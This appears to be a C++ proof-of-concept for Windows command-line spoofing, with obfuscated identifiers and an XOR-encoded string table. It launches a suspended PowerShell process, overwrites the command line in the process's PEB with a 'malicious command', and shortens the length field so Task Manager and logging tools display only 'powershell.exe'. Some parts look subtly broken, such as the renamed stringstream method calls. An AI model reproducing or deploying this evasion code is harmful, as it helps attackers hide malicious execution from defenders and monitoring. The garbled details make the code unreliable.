#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>


#pragma comment(lib, "ntdll.lib")
#ifdef _DEBUG
#endif
#ifdef _DEBUG
#endif
namespace {
char _obf_data_0[] = { 37, 58, 34, 48, 39, 38, 61, 48, 57, 57, 123, 48, 45, 48, 0 };
char* _obf_str_table[] = {
_obf_data_0,
};
char _obf_decode_buffer[4096];
const char* _obf_str(int id) {
char* s = _obf_str_table[id];
int i = 0;
for (; s[i] != 0; ++i) _obf_decode_buffer[i] = s[i] ^ 85;
_obf_decode_buffer[i] = 0;
return _obf_decode_buffer;
}
}
extern "C" NTSTATUS NtReadVirtualMemory(
HANDLE _C7M8EO18,
PVOID _PP6RS00L,
PVOID _DQHIGFTF,
ULONG _TJ9O2HXA,
PULONG _M8DPDC8I
);
extern "C" NTSTATUS NtWriteVirtualMemory(
HANDLE _C7M8EO18,
PVOID _PP6RS00L,
PVOID _DQHIGFTF,
ULONG _DDGUQMTT,
PULONG _5SGGGV8M
);
extern "C" NTSTATUS NtResumeThread(
HANDLE _9XYOFGTT,
PULONG _ORJZ0OX5
);
struct CUSTOM_PEB {
BYTE _J4Q3NFFC[16];
PVOID ImageBaseAddress;
PVOID Ldr;
PVOID ProcessParameters;
};
struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
BYTE _J4Q3NFFC[112];
USHORT Length;
USHORT MaximumLength;
PVOID CommandLine;
};
void Debug(const std::wstring& _OP6N7PAM) {
std::wcout << _OP6N7PAM << std::endl;
}
void Debug(const std::wstring& _OP6N7PAM, const std::vector<std::wstring>& _A6118UKK) {
std::wstring _LTH8O0N2 = _OP6N7PAM;
for (size_t _FNTBPTA7 = 0; _FNTBPTA7 < _A6118UKK.size(); _FNTBPTA7++) {
std::wstring _TXILOQPJ = L"{" + std::to_wstring(_FNTBPTA7) + L"}";
size_t _VQO3MIDV = _LTH8O0N2.find(_TXILOQPJ);
if (_VQO3MIDV != std::wstring::npos) {
_LTH8O0N2.replace(_VQO3MIDV, _TXILOQPJ.length(), _A6118UKK[_FNTBPTA7]);
}
}
std::wcout << _LTH8O0N2 << std::endl;
}
std::wstring PadRight(const std::wstring& _ZQT28YI1, size_t _I71IEXM9, wchar_t _9079RD26) {
if (_ZQT28YI1.length() >= _I71IEXM9) return _ZQT28YI1;
return _ZQT28YI1 + std::wstring(_I71IEXM9 - _ZQT28YI1.length(), _9079RD26);
}
int main() {
std::wstring _0OJ40BI5 = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
std::wstring _V5QYH2KK = PadRight(L"powershell.exe", _0OJ40BI5.length(), L' ');
Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
Debug(L"[+] Malicious command length: " + std::to_wstring(_0OJ40BI5.length()));
Debug(L"[+] Malicious command: " + _0OJ40BI5);
Debug(L"[+] Spoofed command length: " + std::to_wstring(_V5QYH2KK.length()));
Debug(L"[+] Spoofed command: " + _V5QYH2KK.substr(0, _V5QYH2KK.find_last_not_of(L' ') + 1));
Debug(L"[+] Spoofed command (with padding): " + _V5QYH2KK);
Debug(L"[+] Creating suspended process...");
STARTUPINFOW _8WYEJEBI = { 0 };
_8WYEJEBI.cb = sizeof(_8WYEJEBI);
SECURITY_ATTRIBUTES _5RZZBAHV = { 0 };
_5RZZBAHV.nLength = sizeof(_5RZZBAHV);
PROCESS_INFORMATION _JU338TZ7 = { 0 };
Debug(L"[+] Calling CreateProcessW with command: " + _V5QYH2KK);
BOOL _C0Z96FW2 = CreateProcessW(
NULL,
const_cast<LPWSTR>(_V5QYH2KK.c_str()),
&_5RZZBAHV,
&_5RZZBAHV,
FALSE,
CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
NULL,
L"C:\\windows\\",
&_8WYEJEBI,
&_JU338TZ7
);
if (!_C0Z96FW2) {
DWORD _820WYNW3 = GetLastError();
Debug(L"[!] Unable to spawn process! Error code: " + std::to_wstring(_820WYNW3));
return 1;
}
Debug(L"[+] Process spawned successfully!");
Debug(L"[+] Process ID: " + std::to_wstring(_JU338TZ7.dwProcessId));
Debug(L"[+] Thread ID: " + std::to_wstring(_JU338TZ7.dwThreadId));
Debug(L"[+] Querying process information...");
PROCESS_BASIC_INFORMATION _W3O9GZ3D = { 0 };
ULONG _NYHK81CP = 0;
NTSTATUS _OS4I8GLH = NtQueryInformationProcess(
_JU338TZ7.hProcess,
ProcessBasicInformation,
&_W3O9GZ3D,
sizeof(_W3O9GZ3D),
&_NYHK81CP
);
if (_OS4I8GLH != 0) {
Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
return 1;
}
Debug(L"[+] NtQueryInformationProcess successful!");
Debug(L"[+] Return length: " + std::to_wstring(_NYHK81CP));
std::wstringstream _X17VT9NY;
_X17VT9NY << std::hex << _W3O9GZ3D.PebBaseAddress;
Debug(L"[+] PEB Address: 0x" + _X17VT9NY._ZQT28YI1());
Debug(L"[+] Reading PEB structure...");
CUSTOM_PEB _TMOKEIJQ = { 0 };
SIZE_T _MNKI51F8 = 0;
_OS4I8GLH = NtReadVirtualMemory(_JU338TZ7.hProcess, _W3O9GZ3D.PebBaseAddress, &_TMOKEIJQ, sizeof(_TMOKEIJQ), (PULONG)&_MNKI51F8);
if (_OS4I8GLH != 0) {
Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
return 1;
}
Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(_MNKI51F8));
std::wstringstream _2OOKD3I7;
_2OOKD3I7 << std::hex << _TMOKEIJQ.ProcessParameters;
Debug(L"[+] ProcessParameters Address: 0x" + _2OOKD3I7._ZQT28YI1());
Debug(L"[+] Reading ProcessParameters structure...");
CUSTOM_RTL_USER_PROCESS_PARAMETERS _JLUEDDYQ = { 0 };
_OS4I8GLH = NtReadVirtualMemory(_JU338TZ7.hProcess, _TMOKEIJQ.ProcessParameters, &_JLUEDDYQ, sizeof(_JLUEDDYQ), (PULONG)&_MNKI51F8);
if (_OS4I8GLH != 0) {
Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
return 1;
}
Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(_MNKI51F8));
Debug(L"[+] CommandLine Length: " + std::to_wstring(_JLUEDDYQ.Length));
Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(_JLUEDDYQ.MaximumLength));
std::wstringstream _8YNZAF1E;
_8YNZAF1E << std::hex << _JLUEDDYQ.CommandLine;
Debug(L"[+] CommandLine Address: 0x" + _8YNZAF1E._ZQT28YI1());
Debug(L"[+] Reading original command line...");
std::vector<wchar_t> _5IQB207K(_JLUEDDYQ.Length / sizeof(wchar_t));
_OS4I8GLH = NtReadVirtualMemory(_JU338TZ7.hProcess, _JLUEDDYQ.CommandLine, _5IQB207K.data(), _JLUEDDYQ.Length, (PULONG)&_MNKI51F8);
if (_OS4I8GLH != 0) {
Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
return 1;
}
std::wstring _0P24UWU6(_5IQB207K.data());
Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(_MNKI51F8));
Debug(L"[+] Original CommandLine: " + _0P24UWU6);
Debug(L"[+] Preparing to write malicious command...");
std::vector<wchar_t> _9ZFAPONQ(_0OJ40BI5.begin(), _0OJ40BI5.end());
Debug(L"[+] New command line length: " + std::to_wstring(_9ZFAPONQ.size()));
Debug(L"[+] New command line size in bytes: " + std::to_wstring(_9ZFAPONQ.size() * sizeof(wchar_t)));
SIZE_T _35K87SMK = 0;
_OS4I8GLH = NtWriteVirtualMemory(_JU338TZ7.hProcess, _JLUEDDYQ.CommandLine, _9ZFAPONQ.data(), _9ZFAPONQ.size() * sizeof(wchar_t), (PULONG)&_35K87SMK);
if (_OS4I8GLH != 0) {
Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
return 1;
}
Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(_35K87SMK));
Debug(L"[+] Writing spoofed command length...");
USHORT _DUAHBS2W = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(_DUAHBS2W));
std::wstringstream _DKPIDXU2;
_DKPIDXU2 << std::hex << (ULONG_PTR)((BYTE*)_TMOKEIJQ.ProcessParameters + 112);
Debug(L"[+] Writing to address: 0x" + _DKPIDXU2._ZQT28YI1());
_OS4I8GLH = NtWriteVirtualMemory(_JU338TZ7.hProcess, (PVOID)((BYTE*)_TMOKEIJQ.ProcessParameters + 112), &_DUAHBS2W, sizeof(_DUAHBS2W), (PULONG)&_35K87SMK);
if (_OS4I8GLH != 0) {
Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
return 1;
}
Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(_35K87SMK));
Debug(L"[+] SPOOFING COMPLETE!");
Debug(L"[+] Process will now show as: powershell.exe");
Debug(L"[+] But will actually execute: " + _0OJ40BI5);
Debug(L"[+] Resuming suspended process...");
ULONG _7HLBO47R = 0;
_OS4I8GLH = NtResumeThread(_JU338TZ7.hThread, &_7HLBO47R);
if (_OS4I8GLH == 0) {
Debug(L"[+] Process resumed successfully!");
Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(_OS4I8GLH));
Debug(L"[+] Previous suspend count: " + std::to_wstring(_7HLBO47R));
} else {
Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(_OS4I8GLH));
}
Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
Debug(L"Press a key to end PoC...");
std::wcin.get();
Debug(L"[+] Cleaning up handles...");
CloseHandle(_JU338TZ7.hProcess);
CloseHandle(_JU338TZ7.hThread);
Debug(L"[+] Cleanup complete!");
return 0;
}